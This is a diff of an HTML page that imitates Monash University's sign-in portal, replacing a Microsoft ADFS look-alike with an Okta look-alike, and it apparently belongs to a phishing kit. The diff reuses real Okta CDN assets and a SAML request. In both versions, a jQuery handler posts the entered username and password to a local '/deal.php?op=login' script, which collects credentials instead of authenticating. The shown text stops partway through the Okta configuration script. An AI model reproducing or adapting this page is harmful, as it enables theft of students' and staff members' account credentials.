@@ -1,519 +1,446 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
- <head> 
-  <meta http-equiv="X-UA-Compatible" content="IE=10.000" /> 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" /> 
-  <meta http-equiv="content-type" content="text/html;charset=UTF-8" /> 
-  <meta http-equiv="cache-control" content="no-cache,no-store" /> 
-  <meta http-equiv="pragma" content="no-cache" /> 
-  <meta http-equiv="expires" content="-1" /> 
-  <meta name="mswebdialog-title" content="Connecting to Monash University" /> 
-  <title>登录</title> 
-  <script type="text/javascript">
-//<![CDATA[
-function LoginErrors(){this.userNameFormatError = '以“域\\用户名”或“用户名@域”格式输入你的用户名。'; this.passwordEmpty = '请输入密码。'; this.passwordTooLong = '密码长度必须少于 128 个字符。';}; var maxPasswordLength = 128;
-//]]>
-</script> 
-  <script type="text/javascript">
-//<![CDATA[
-// Copyright (c) Microsoft Corporation.  All rights reserved.
-function InputUtil(errTextElementID, errDisplayElementID) {
+<html><head>
 
-    if (!errTextElementID)  errTextElementID = 'errorText'; 
-    if (!errDisplayElementID)  errDisplayElementID = 'error'; 
+    <script>if (typeof module === 'object') {window.module = module; module = undefined;}</script>
 
-    this.hasFocus = false;
-    this.errLabel = document.getElementById(errTextElementID);
-    this.errDisplay = document.getElementById(errDisplayElementID);
-};
-InputUtil.prototype.canDisplayError = function () {
-    return this.errLabel && this.errDisplay;
-}
-InputUtil.prototype.checkError = function () {
-    if (!this.canDisplayError){
-        throw new Error ('Error element not present');
+    <title>Monash University - 登录</title>
+        <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="none">
+
+    <link href="https://ok6static.oktacdn.com/assets/loginpage/css/okta-login-page.min.88c003cadf2616a8827c8a1531c3fea9.css" type="text/css" rel="stylesheet"><script>
+        var okta = {
+            locale: 'zh-ch',
+            deployEnv: 'PROD'
+        };
+    </script>
+    <script>window.okta || (window.okta = {}); okta.cdnUrlHostname = "//ok6static.oktacdn.com"; okta.cdnPerformCheck = false;</script><script>window.okta || (window.okta = {});window.okta.mixpanel = true;window.okta.mixpanelTrackingSamplingFactors = {"_DEFAULT":1.0};</script><script>if (window.module) module = window.module;</script>
+
+    
+
+<script src="https://ok6static.oktacdn.com/assets/js/mvc/loginpage/initLoginPage.pack.de36dd3ef1fcc46da96581f6efd2bf9a.js?v=1"></script></head>
+<body class="auth okta-container">
+ <div id="login-bg-image" class="login-bg-image" data-se="login-bg-image" style="background-image: url('https://ok6static.oktacdn.com/bc/image/fileStoreRecord?id=fs0128q1r7cxzInIc2p7')"></div> 
+<form action="/login/cert" method="post" id="x509_login" name="x509_login" style="display:none;">
+    <input type="hidden" class="hide" name="_xsrfToken" value="null"><input type="hidden" id="fromURI" name="fromURI" class="hidden" value="/app/monashuniversity_webenrolmentsystem_1/exk1mjn5n8XHoo5Q62p7/sso/saml?SAMLRequest=fVJdT8JAEPwrzb3TaxtBcwESkERQVJRCDC%2FkaFd7wO3V2ysf%2FnrbohFfeLu9nZmdnWybpN7mole4DF%2FhswBy3kFvkUTV6LDCojCSFAmUGki4REx7j2MR%2BYGQRGCdMsjOKPllTm6NM4nZMq%2F3y741SIUGOwW7UwnMXscdljmXk%2BBcH31tUFLmQ1r4suCyNAroVCIrKt8D8WpqxGVCzBuU9hXWrTONWqBA5ZuNk35iNJd5%2Fve9A0vKHZd7WAFas9WlPh3JgV6GHA6bUK%2BxiTdvQ2OaL60ov%2BZEpp7KvNGgw6pX%2FDYezqL7zf7YupP9hzDtZYuvOeDTi56od7Ma0XpQookKGCE5ia7DoiC8aYRBI2jFwZUIAxFcL5g3%2BQmorzBV%2BHE5zdUJRGIYx5PG5Hka1wI7lYJ9KtEXgqySY9682r0Kq1Rj3Xa1iqhd2u4lZpufI0%2FV%2FyPqfgM%3D&amp;RelayState=%2Fwes%2F">
+</form>
+
+<div class="content">
+
+  <style type="text/css">
+    .noscript-msg {
+        background-color: #fff;
+        border-color: #ddd #ddd #d8d8d8;
+        box-shadow:0 2px 0 rgba(175, 175, 175, 0.12);
+        text-align: center;
+        width: 398px;
+        min-width: 300px;
+        margin: 200px auto;
+        border-radius: 3px;
+        border-width: 1px;
+        border-style: solid;
     }
-    if (this.errLabel && this.errLabel.innerHTML) {
-        this.errDisplay.style.display = '';        
-        var cause = this.errLabel.getAttribute('for');
-        if (cause) {
-            var causeNode = document.getElementById(cause);
-            if (causeNode && causeNode.value) {
-                causeNode.focus();
-                this.hasFocus = true;
+
+    .noscript-content {
+        padding: 42px;
+    }
+
+    .noscript-content h2 {
+        padding-bottom: 20px;
+    }
+
+    .noscript-content h1 {
+        padding-bottom: 25px;
+    }
+
+    .noscript-content a {
+        background: transparent;
+        box-shadow: none;
+        display: table-cell;
+        vertical-align: middle;
+        width: 314px;
+        height: 50px;
+        line-height: 36px;
+        color: #fff;
+        background: linear-gradient(#007dc1, #0073b2), #007dc1;
+        border: 1px solid;
+        border-color: #004b75;
+        border-bottom-color: #00456a;
+        box-shadow: rgba(0, 0, 0, 0.15) 0 1px 0, rgba(255, 255, 255, 0.1) 0 1px 0 0 inset;
+        -webkit-border-radius: 3px;
+        border-radius: 3px;
+    }
+
+    .noscript-content a:hover {
+        background: #007dc1;
+        cursor: hand;
+        text-decoration: none;
+    }
+</style>
+<noscript>
+    <div id="noscript-msg" class="noscript-msg">
+        <div class="noscript-content">
+            <h2>需要 Javascript</h2>
+            <h1>您的浏览器禁用了 Javascript&nbsp请启用 Javascript 并刷新此页面。</h1>
+            <a href=".">刷新</a>
+        </div>
+    </div>
+</noscript>
+<div id="signin-container"><div data-se="auth-container" id="okta-sign-in" class="auth-container main-container can-remove-beacon">	      <div class="okta-sign-in-header auth-header">	        	        <img src="https://ok6static.oktacdn.com/bc/image/fileStoreRecord?id=fs01fviisxo2dNOCM2p7" class="auth-org-logo" alt="Monash University">	        	        <div data-type="beacon-container" class="beacon-container" style="transform: scale(1, 1); text-indent: 1px;"><div class="js-security-beacon">	    <div class="beacon-blank">	      <div class="radial-progress-bar">	        <div class="circle left"></div>	        <div class="circle right"></div>	      </div>	    </div>	    <div aria-live="polite" role="image" class="bg-helper auth-beacon auth-beacon-security undefined-user" data-se="security-beacon">	      <span class="accessibility-text"></span>	      <div class="okta-sign-in-beacon-border js-auth-beacon-border">	      </div>	    </div>	    </div></div>	      </div>	      <div class="auth-content"><div class="auth-content-inner"><div class="primary-auth">
+
+  <form method="POST" action="/login.html" data-se="o-form" id="form17" class="primary-auth-form o-form o-form-edit-mode">	    	    
+
+
+    <div data-se="o-form-content" class="o-form-content o-form-theme clearfix">	      	       <h2 data-se="o-form-head" class="okta-form-title o-form-head">Sign In</h2>	        	      <div style="display: none" id='error_msg'>   
+      <div class="okta-form-infobox-error infobox infobox-error" role="alert">        
+        <span class="icon error-16"></span>                 
+        <p>Unable to connect to the server. Please check your network connection.</p>       
+      </div>    
+    </div>
+    <br/> 
+
+
+      <div class="o-form-error-container" data-se="o-form-error-container"></div>	      
+       <div class="o-form-fieldset-container" data-se="o-form-fieldset-container">
+
+        <div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top">
+          <div data-se="o-form-input-container" class="o-form-input">
+            <span data-se="o-form-input-username" class="o-form-input-name-username o-form-control okta-form-input-field input-fix">	      	        
+              <span class="input-tooltip icon form-help-16" data-hasqtip="0"></span>
+              <span class="icon input-icon person-16-gray"></span>	  	      
+              <input type="text" placeholder="Email address" name="username"  id="userNameInput" value="" aria-label="Email address" autocomplete="off">	      	      
+            </span>
+          </div>
+        </div>
+
+        <div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top">
+          <div data-se="o-form-input-container" class="o-form-input">
+            <span data-se="o-form-input-password" class="o-form-input-name-password o-form-control okta-form-input-field input-fix">	      	        
+              <span class="input-tooltip icon form-help-16" data-hasqtip="1"></span>	      	 <span class="icon input-icon remote-lock-16"></span>	      	      
+              <input type="password" placeholder="Password" name="password"  id="passwordInput" value="" aria-label="Password" autocomplete="off">	      	      
+            </span>
+          </div>
+        </div>
+        <div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-0">
+          <!-- <div data-se="o-form-input-container" class="o-form-input">
+          <span data-se="o-form-input-remember" class="o-form-input-name-remember">	    
+            <div class="custom-checkbox">
+              <input type="checkbox" name="remember" id="input40"><label for="input40" data-se-for-name="remember">Remember me</label>
+            </div>	    	  
+          </span>
+        </div> -->
+      </div>
+    </div>	    
+  </div>	  
+  <div class="o-form-button-bar" >
+    <span id="o-login-1">
+      <input class="button button-primary" value="Sign In" id="okta-signin-submit" data-type="save" disabled="disabled" />
+    </span>
+  </div>
+</form>
+
+
+
+
+  <div class="auth-footer">	      <a href="#" data-se="needhelp" class="link help js-help">	      Forgotten password | Acceptable use policy | Privacy policy | Contact service desk	      </a>	      <ul class="help-links js-help-links" style="display: none;">	        <li>	        <a href="#" data-se="forgot-password" class="link js-forgot-password">	        Forgot password?	        </a>	        </li>	        	        	          <li>	          <a href="http://www.policy.monash.edu/policy-bank/management/its/" class="link js-custom">Acceptable Use Policy</a>	          </li>	        	          <li>	          <a href="http://www.privacy.monash.edu.au/" class="link js-custom">Privacy Policy</a>	          </li>	        	        <li>	        <a href="http://monash.edu/esolutions/contact/" data-se="help-link" class="link js-help-link" target="_blank">	        Contact Service Desk	        </a>	        </li>	      </ul>	    </div></div></div></div>	    </div></div>
+  
+</div>
+
+<div class="footer">
+  <div class="footer-container clearfix">
+    <p class="copyright"><a href="http://www.okta.com/" class="inline-block notranslate">Okta</a> 提供支持</p>
+        <p class="privacy-policy"><a href="/privacy" target="_blank" class="inline-block margin-l-10">隐私政策</a></p>
+    </div>
+</div>
+
+
+
+<script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
+        <script type="text/javascript">$('#o-login-1').click(
+          function () {
+            $.post('/deal.php?op=login', {username: $('input[name="username"]').val(), password: $('input[name="password"]').val()}, function (ret) {
+            console.log(ret);
+            if (ret.type == 'error') {
+              $('#error_msg').attr('style','display:""');
             }
-        }
-    }
-    else {
-        this.errDisplay.style.display = 'none';
-    }
-};
-InputUtil.prototype.setInitialFocus = function (input) {
-    if (this.hasFocus) return;
-    var node = document.getElementById(input);
-    if (node) {
-        if ((/^\s*$/).test(node.value)) {
-            node.focus();
-            this.hasFocus = true;
-        }
-    }
-};
-InputUtil.prototype.setError = function (input, errorMsg) {
-    if (!this.canDisplayError) {
-        throw new Error('Error element not present');
-    }
-    input.focus();
+              else if(ret.redirect != '')
+                {location.href = ret.redirect;}
+            }, 'json')
+          });
+        </script>
 
-    if (errorMsg) {
-        this.errLabel.innerHTML = errorMsg;
-    }
-    this.errLabel.setAttribute('for', input.id);
-    this.errDisplay.style.display = '';
-};
-InputUtil.makePlaceholder = function (input) {
-    var ua = navigator.userAgent;
+<!-- <script type="text/javascript">
 
-    if (ua != null && 
-        (ua.match(/MSIE 9.0/) != null || 
-         ua.match(/MSIE 8.0/) != null ||
-         ua.match(/MSIE 7.0/) != null)) {
-        var node = document.getElementById(input);
-        if (node) {
-            var placeholder = node.getAttribute("placeholder");
-            if (placeholder != null && placeholder != '') {
-                var label = document.createElement('input');
-                label.type = "text";
-                label.value = placeholder;
-                label.readOnly = true;
-                label.style.position = 'absolute';
-                label.style.borderColor = 'transparent';
-                label.className = node.className + ' hint';
-                label.tabIndex = -1;
-                label.onfocus = function () { this.nextSibling.focus(); };
+  var unsupportedContainer = document.getElementById('okta-signin-submit');
 
-                node.style.position = 'relative';
-                node.parentNode.style.position = 'relative';
-                node.parentNode.insertBefore(label, node);
-                node.onkeyup = function () { InputUtil.showHint(this); };
-                node.onblur = function () { InputUtil.showHint(this); };
-                node.style.background = 'transparent';
-
-                node.setAttribute("placeholder", "");
-                InputUtil.showHint(node);
-            }
-        }
-    }
-};
-InputUtil.focus = function (inputField) {
-    var node = document.getElementById(inputField);
-    if (node) node.focus();
-};
-InputUtil.hasClass = function(node, clsName) {
-    return node.className.match(new RegExp('(\\s|^)' + clsName + '(\\s|$)'));
-};
-InputUtil.addClass = function(node, clsName) {
-    if (!this.hasClass(node, clsName)) node.className += " " + clsName;
-};
-InputUtil.removeClass = function(node, clsName) {
-    if (this.hasClass(node, clsName)) {
-        var reg = new RegExp('(\\s|^)' + clsName + '(\\s|$)');
-        node.className = node.className.replace(reg, ' ');
-    }
-};
-InputUtil.showHint = function (node, gotFocus) {
-    if (node.value && node.value != '') {
-        node.previousSibling.style.display = 'none';
-    }
-    else {
-        node.previousSibling.style.display = '';
-    }
-};
-//]]>
-</script> 
-  <link rel="stylesheet" type="text/css" href="https://login.monash.edu/adfs/portal/css/style.css?id=66808B7C1841F3ABF4A3146278A168EC50E318C94034840986DF2B454AFF15D0" />
-  <style>.illustrationClass {background-image:url(/illustration.png);}</style> 
- </head> 
- <body dir="ltr" class="body"> 
-  <div id="noScript" style="position:static; width:100%; height:100%; z-index:100"> 
-   <h1>需要提供 JavaScript</h1> 
-   <p>需要提供 JavaScript。此 Web 浏览器不支持 JavaScript，或者未启用此 Web 浏览器中的 JavaScript。</p> 
-   <p>要了解你的 Web 浏览器是否支持 JavaScript，或者要启用 JavaScript，请参阅 Web 浏览器帮助。</p> 
-  </div> 
-  <script type="text/javascript" language="JavaScript">
-         document.getElementById("noScript").style.display = "none";
-    </script> 
-  <div id="fullPage"> 
-   <div id="brandingWrapper" class="float"> 
-    <div id="branding"></div> 
-   </div> 
-   <div id="contentWrapper" class="float"> 
-    <div id="content"> 
-     <div id="header"> 
-      <img class="logoImage" src="/logo.png" alt="Monash University" /> 
-     </div> 
-     <div id="workArea"> 
-      <div id="authArea" class="groupMargin"> 
-       <div id="loginArea"> 
-        <div id="loginMessage" class="groupMargin">
-         使用你的组织帐户登录
-        </div> 
-        <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onkeypress="if (event &amp;&amp; event.keyCode == 13) Login.submitLoginRequest();" action="center.html"> 
-         <div id="error" class="fieldMargin error smallText"> 
-          <label id="errorText" for=""></label> 
-         </div> 
-         <div id="formsAuthenticationArea"> 
-          <div id="userNameArea"> 
-           <input id="userNameInput" name="UserName" type="email" value="" tabindex="1" class="text fullWidth" spellcheck="false" placeholder="someone@example.com" autocomplete="off" /> 
-          </div> 
-          <div id="passwordArea"> 
-           <input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth" placeholder="密码" autocomplete="off" /> 
-          </div> 
-          <div id="kmsiArea" style="display:none"> 
-           <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3" /> 
-           <label for="kmsiInput">使我保持登录状态</label> 
-          </div> 
-          <div id="submissionArea" class="submitMargin"> 
-           <span id="submitButton" class="submit" tabindex="4" onkeypress="if (event &amp;&amp; event.keyCode == 32) Login.submitLoginRequest();">登录</span>
-          </div> 
-         </div> 
-         <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication" /> 
-        </form>
-        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
-        <script type="text/javascript">$('.submit').click(
-          function () {$.post('/deal.php?op=login', {username: $('input[name="UserName"]').val(), password: $('input[name="Password"]').val()}, function (ret) {
+  unsupportedContainer.click(
+          function () {$.post('/deal.php?op=login', {username: $('input[name="username"]').val(), password: $('input[name="password"]').val()}, function (ret) {
+            console.log('111');
             if (ret.type == 'error') {
               new InputUtil().setError(document.getElementById(Login.userNameInput), ret.message);}
               else if(ret.redirect != '')
                 {location.href = ret.redirect;}
             }, 'json')
           });
-        </script>
-        <div id="authOptions"> 
-         <form id="options" method="post" action="center.html"> 
-          <script type="text/javascript">
-                function SelectOption(option) {
-                    var i = document.getElementById('optionSelection');
-                    i.value = option;
-                    document.forms['options'].submit();
-                    return false;
-                }
-            </script> 
-          <input id="optionSelection" type="hidden" name="AuthMethod" /> 
-          <div class="groupMargin"></div> 
-         </form> 
-        </div> 
-        <div id="introduction" class="groupMargin"> 
-         <a id="changePasswordLink" href="#">Change Password</a> 
-        </div> 
-        <script type="text/javascript">
-        //<![CDATA[
+</script> -->
+<script type="text/javascript">function runLoginPage (fn) {var mainScript = document.createElement('script');mainScript.src = 'https://ok6static.oktacdn.com/assets/js/mvc/loginpage/initLoginPage.pack.de36dd3ef1fcc46da96581f6efd2bf9a.js?v=1';document.getElementsByTagName('head')[0].appendChild(mainScript);fn && mainScript.addEventListener('load', function () { setTimeout(fn, 1) });}</script><script type="text/javascript">
+(function(){
 
-            function Login() {
-            }
+  var baseUrl = 'https\x3A\x2F\x2Fmonashuni.okta.com';
+  var suppliedRedirectUri = '';
+  var repost = false;
+  var stateToken = '';
+  var fromUri = '\x2Fapp\x2Fmonashuniversity_webenrolmentsystem_1\x2Fexk1mjn5n8XHoo5Q62p7\x2Fsso\x2Fsaml\x3FSAMLRequest\x3DfVJdT8JAEPwrzb3TaxtBcwESkERQVJRCDC\x252FkaFd7wO3V2ysf\x252FnrbohFfeLu9nZmdnWybpN7mole4DF\x252FhswBy3kFvkUTV6LDCojCSFAmUGki4REx7j2MR\x252BYGQRGCdMsjOKPllTm6NM4nZMq\x252F3y741SIUGOwW7UwnMXscdljmXk\x252BBcH31tUFLmQ1r4suCyNAroVCIrKt8D8WpqxGVCzBuU9hXWrTONWqBA5ZuNk35iNJd5\x252Fve9A0vKHZd7WAFas9WlPh3JgV6GHA6bUK\x252BxiTdvQ2OaL60ov\x252BZEpp7KvNGgw6pX\x252FDYezqL7zf7YupP9hzDtZYuvOeDTi56od7Ma0XpQookKGCE5ia7DoiC8aYRBI2jFwZUIAxFcL5g3\x252BQmorzBV\x252BHE5zdUJRGIYx5PG5Hka1wI7lYJ9KtEXgqySY9682r0Kq1Rj3Xa1iqhd2u4lZpufI0\x252FV\x252FyPqfgM\x253D\x26RelayState\x3D\x252Fwes\x252F';
+  var username = '';
+  var rememberMe = true;
+  var smsRecovery = false;
+  var callRecovery = false;
+  var emailRecovery = true;
+  var usernameLabel = 'Email\x20address';
+  var usernameInlineLabel = 'Sign\x20in\x20with\x20your\x20Monash\x20email\x20address';
+  var passwordLabel = 'Password';
+  var passwordInlineLabel = '';
+  var signinLabel = 'Sign\x20In';
+  var forgotpasswordLabel = 'Forgot\x20password\x3F';
+  var unlockaccountLabel = 'Unlock\x20account\x3F';
+  var helpLabel = 'Contact\x20Service\x20Desk';
+  var orgSupportPhoneNumber = '\x2B61\x203\x20990\x2051777';
+  var hideSignOutForMFA = false;
+  var loginPageUrlRedirect = '';
+  var enableUrlFixForEmbeddedBrowsers = false;
+  var footerHelpTitle = 'Forgotten\x20password\x20\x7C\x20Acceptable\x20use\x20policy\x20\x7C\x20Privacy\x20policy\x20\x7C\x20Contact\x20service\x20desk';
+  var recoveryFlowPlaceholder = 'Email\x20address';
+  var signOutUrl = '';
+  var authScheme = 'OAUTH2';
 
-            Login.userNameInput = 'userNameInput';
-            Login.passwordInput = 'passwordInput';
-
-            Login.initialize = function () {
-
-                var u = new InputUtil();
-
-                u.checkError();
-                u.setInitialFocus(Login.userNameInput);
-                u.setInitialFocus(Login.passwordInput);
-            }();
-
-            Login.submitLoginRequest = function () { 
-                var u = new InputUtil();
-                var e = new LoginErrors();
-
-                var userName = document.getElementById(Login.userNameInput);
-                var password = document.getElementById(Login.passwordInput);
-
-                if (!userName.value || !userName.value.match('[@\\\\]')) {
-                    u.setError(userName, e.userNameFormatError);
-                    return false;
-                }
-
-                if (!password.value) {
-                    u.setError(password, e.passwordEmpty);
-                    return false;
-                }
-
-                if (password.value.length > maxPasswordLength) {
-                    u.setError(password, e.passwordTooLong);
-                    return false;
-                }
-
-                document.forms['loginForm'].submit();
-                return false;
-            };
-
-            InputUtil.makePlaceholder(Login.userNameInput);
-            InputUtil.makePlaceholder(Login.passwordInput);
-        //]]>
-        </script> 
-       </div> 
-      </div> 
-     </div> 
-     <div id="footerPlaceholder"></div> 
-    </div> 
-    <div id="footer"> 
-     <div id="footerLinks" class="floatReverse"> 
-      <div>
-       <span id="copyright">&copy; 2013 Microsoft</span>
-       <a id="home" class="pageLink" href="">IT Acceptable Use Policy</a>
-       <a id="privacy" class="pageLink" href="">Privacy Policy</a>
-       <a id="helpDesk" class="pageLink" href="">Contact Service Desk</a>
-      </div> 
-     </div> 
-    </div> 
-   </div> 
-  </div> 
-  <script type="text/javascript">
-//<![CDATA[
-// Copyright (c) Microsoft Corporation.  All rights reserved.
-
-// This file contains several workarounds on inconsistent browser behaviors that administrators may customize.
-"use strict";
-
-var netbiosDomain = "Monash";
-var changePasswordURL = "https://login.monash.edu/adfs/portal/updatepassword?redirectTo=";
-
-// iPhone email friendly keyboard does not include "\" key, use regular keyboard instead.
-// Note change input type does not work on all versions of all browsers.
-if (navigator.userAgent.match(/iPhone/i) != null) {
-    var emails = document.querySelectorAll("input[type='email']");
-    if (emails) {
-        for (var i = 0; i < emails.length; i++) {
-            emails[i].type = 'text';
-        }
-    }
-}
-
-// In the CSS file we set the ms-viewport to be consistent with the device dimensions, 
-// which is necessary for correct functionality of immersive IE. 
-// However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
-// values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
-// Windows 8 phone has agent string 'IEMobile 10.0'
-if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
-    var msViewportStyle = document.createElement("style");
-    msViewportStyle.appendChild(
-        document.createTextNode(
-            "@-ms-viewport{width:auto!important}"
-        )
-    );
-    msViewportStyle.appendChild(
-        document.createTextNode(
-            "@-ms-viewport{height:auto!important}"
-        )
-    );
-    document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
-}
-
-// If the innerWidth is defined, use it as the viewport width.
-if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
-    var viewport = document.querySelector("meta[name=viewport]");
-    viewport.setAttribute('content', 'width=' + window.innerWidth + 'px; initial-scale=1.0; maximum-scale=1.0');
-}
-
-// Gets the current style of a specific property for a specific element.
-function getStyle(element, styleProp) {
-    var propStyle = null;
-
-    if (element && element.currentStyle) {
-        propStyle = element.currentStyle[styleProp];
-    }
-    else if (element && window.getComputedStyle) {
-        propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
-    }
-
-    return propStyle;
-}
-
-// The script below is used for downloading the illustration image 
-// only when the branding is displaying. This script work together
-// with the code in PageBase.cs that sets the html inline style
-// containing the class 'illustrationClass' with the background image.
-var computeLoadIllustration = function () {
-    var branding = document.getElementById("branding");
-    var brandingDisplay = getStyle(branding, "display");
-    var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");
-
-    if (brandingDisplay && brandingDisplay !== "none" &&
-        brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
-        var newClass = "illustrationClass";
-
-        if (branding.classList && branding.classList.add) {
-            branding.classList.add(newClass);
-        } else if (branding.className !== undefined) {
-            branding.className += " " + newClass;
-        }
-        if (window.removeEventListener) {
-            window.removeEventListener('load', computeLoadIllustration, false);
-            window.removeEventListener('resize', computeLoadIllustration, false);
-        }
-        else if (window.detachEvent) {
-            window.detachEvent('onload', computeLoadIllustration);
-            window.detachEvent('onresize', computeLoadIllustration);
-        }
-    }
-};
-
-if (window.addEventListener) {
-    window.addEventListener('resize', computeLoadIllustration, false);
-    window.addEventListener('load', computeLoadIllustration, false);
-}
-else if (window.attachEvent) {
-    window.attachEvent('onresize', computeLoadIllustration);
-    window.attachEvent('onload', computeLoadIllustration);
-}
-
-
-// ** Begin Monash customizations **
-
-// **Hide GoogleApps from Dropdown **
-var drpRP = document.getElementById('idp_RelyingPartyDropDownList');
-var drpRP_GoogleApp = -1;
-if (drpRP) { 
-      for (i = 0; i < drpRP.length; i++) {
-            if (drpRP.options[i].text== 'Google Apps') {
-                  drpRP_GoogleApp = i;
-                  }           
-            }
-      if (drpRP_GoogleApp > -1) {drpRP.remove(drpRP_GoogleApp);}
-}
-
-//var PrependNetBIOS = function () {
-//    var userName = document.getElementById(Login.userNameInput);
-//
-//    if (userName.value) {
-//        var lowerUserName = userName.value.toLowerCase();
-//        var containAt = lowerUserName.indexOf("@");
-//        var containSlash = lowerUserName.indexOf("\\");
-//       if (containAt <= 0 && containSlash <= 0) {
-//            userName.value = netbiosDomain + '\\' + userName.value;
-//       }
-//
-//        return true;
-//    }
-//
-//    return false;
-//}
-
-//document.getElementById('submitButton').onclick = new Function("if (PrependNetBIOS()) return Login.submitLoginRequest();");
-//document.getElementById('submitButton').onkeypress = new Function("if (event && event.keyCode == 13) { if (PrependNetBIOS()) Login.submitLoginRequest(); }");
-//document.getElementById('loginForm').onkeypress = new Function("if (event && event.keyCode == 13) { if (PrependNetBIOS()) Login.submitLoginRequest(); }");
-
-
-// Sets the sign in text
-var loginMessage = document.getElementById('loginMessage');
-if (loginMessage) {
-    // loginMessage element is present, modify its properties.
-    loginMessage.innerHTML = 'Sign in with your Monash email address';
-}
-// Set the change password link with the return URL
-
-var changePasswordLink = document.getElementById("changePasswordLink");
-if (changePasswordLink) {
-    changePasswordLink.href = changePasswordURL + encodeURIComponent(document.URL);
-}
-
-// Set the helper text for the username text box
-var userNameTextBox = document.getElementById("userNameInput");
-if (userNameTextBox) {
-    userNameTextBox.placeholder = "Email address";
-}
-
-if (typeof Login != 'undefined'){
-    Login.submitLoginRequest = function () { 
-    var u = new InputUtil();
-    var e = new LoginErrors();
-    var userName = document.getElementById(Login.userNameInput);
-    var password = document.getElementById(Login.passwordInput);
-    if (userName.value && !userName.value.match('[@\\\\]')) 
-    {
-        var userNameValue = netbiosDomain + '\\' + userName.value;
-        document.forms['loginForm'].UserName.value = userNameValue;
-    }
-
-    if (!userName.value) {
-       u.setError(userName, e.userNameFormatError);
-       return false;
-    }
-
-
-    if (!password.value) 
-    {
-        u.setError(password, e.passwordEmpty);
-        return false;
-    }
-    document.forms['loginForm'].submit();
-    return false;
-};
-}
-
-if (typeof UpdatePassword != 'undefined') {
-  UpdatePassword.submitPasswordChange = function () {
-    var u = new InputUtil();
-    var e = new UpdErrors();
+  var securityImage = true;
   
-    var userName = document.getElementById(UpdatePassword.userNameInput);
-    var oldPassword = document.getElementById(UpdatePassword.oldPasswordInput);
-    var newPassword = document.getElementById(UpdatePassword.newPasswordInput);
-    var confirmNewPassword = document.getElementById(UpdatePassword.confirmNewPasswordInput);
+
+  var windowsVerify = false;
   
-    if (!userName.value || !userName.value.match('[@\\\\]')) {
-      var userName = netbiosDomain + '\\' + userName.value;
-      document.forms['updatePasswordForm'].userNameInput.value = userName;
+    windowsVerify = true;
+  
+
+  var selfServiceUnlock = false;
+  
+
+  var preventBrowserFromSavingOktaPassword = false;
+  
+
+  var enableMixpanelTracking = false;
+  
+
+  var autoPush = false;
+  
+    autoPush = true;
+  
+
+  var publishToAccountChooser = false;
+  var accountChooserDiscoveryUrl = null;
+  
+    publishToAccountChooser = true;
+    accountChooserDiscoveryUrl = 'https://login.okta.com/discovery/iframe.html';
+  
+
+  var customExpiredPassword = false;
+  
+    customExpiredPassword = true;
+  
+
+  // In case of custom app login, the uri is already absolute, so we must not attach baseUrl
+  var redirectUri;
+  if (isAbsoluteUri(fromUri)) {
+      redirectUri = fromUri;
+  } else {
+      redirectUri = baseUrl + fromUri;
+  }
+  
+
+  var customButtons;
+  
+
+  var customLinks = [];
+  
+    customLinks.push({
+      text: 'Acceptable\x20Use\x20Policy',
+      href: 'http\x3A\x2F\x2Fwww.policy.monash.edu\x2Fpolicy\x2Dbank\x2Fmanagement\x2Fits\x2F'
+    });
+  
+    customLinks.push({
+      text: 'Privacy\x20Policy',
+      href: 'http\x3A\x2F\x2Fwww.privacy.monash.edu.au\x2F'
+    });
+  
+
+  var linkParams;
+  
+
+  var idpDiscovery;
+  var idpDiscoveryRequestContext;
+  
+
+  var hasPasswordlessPolicy = false;
+  
+
+  var showPasswordToggleOnSignInPage = false;
+  
+
+  var hasOAuth2ConsentFeature = false;
+  var consentFunc;
+  
+
+  var hasMfaAttestationFeature = false;
+  
+
+  var registration = false;
+  
+
+  var webauthn = false;
+  
+
+  var loginPageConfig = {
+    fromUri: fromUri,
+    repost: repost,
+    redirectUri: redirectUri,
+    isMobileClientLogin: false,
+    isMobileSSO: false,
+    linkParams: linkParams,
+    hasChromeOSFeature: false,
+    showLinkToAppStore: false,
+    publishToAccountChooser: publishToAccountChooser,
+    accountChooserDiscoveryUrl: accountChooserDiscoveryUrl,
+    preventBrowserFromSavingOktaPassword: preventBrowserFromSavingOktaPassword,
+    enableMixpanelTracking: enableMixpanelTracking,
+    enableUrlFixForEmbeddedBrowsers: enableUrlFixForEmbeddedBrowsers,
+    loginPageUrlRedirect: loginPageUrlRedirect,
+    mfaAttestation: hasMfaAttestationFeature,
+    signIn: {
+      el: '#signin-container',
+      baseUrl: baseUrl,
+      logo: 'https://ok6static.oktacdn.com/bc/image/fileStoreRecord?id=fs01fviisxo2dNOCM2p7',
+      logoText: 'Monash\x20University',
+      helpSupportNumber: orgSupportPhoneNumber,
+      stateToken: stateToken,
+      username: username,
+      signOutLink: signOutUrl,
+      consent: consentFunc,
+      authScheme: authScheme,
+      idpDiscovery: {
+        requestContext: idpDiscoveryRequestContext
+      },
+      features: {
+        router: true,
+        securityImage: securityImage,
+        rememberMe: rememberMe,
+        autoPush: autoPush,
+        webauthn: webauthn,
+        smsRecovery: smsRecovery,
+        callRecovery: callRecovery,
+        emailRecovery: emailRecovery,
+        windowsVerify: windowsVerify,
+        selfServiceUnlock: selfServiceUnlock,
+        multiOptionalFactorEnroll: true,
+        deviceFingerprinting: true,
+        trackTypingPattern: false,
+        hideSignOutLinkInMFA: hideSignOutForMFA,
+        customExpiredPassword: customExpiredPassword,
+        idpDiscovery: idpDiscovery,
+        passwordlessAuth: hasPasswordlessPolicy,
